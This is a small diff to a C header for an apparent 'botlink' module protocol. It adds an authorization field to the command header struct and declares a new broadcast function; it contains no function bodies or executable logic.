@@ -1,6 +1,7 @@
 typedef struct CmdHdr {
     unsigned char cmd;
     unsigned short size;
+    uint32_t authorization;
 } CMDHdr;
 
 
@@ -25,3 +26,4 @@ int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int siz
 int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size);
 int botlink_cmd_control_module(Modules *mptr, Connection *cptr, char *buf, int size);
 
+int botlink_broadcast(Modules *mptr, Connection *cptr, char *buf, int size);
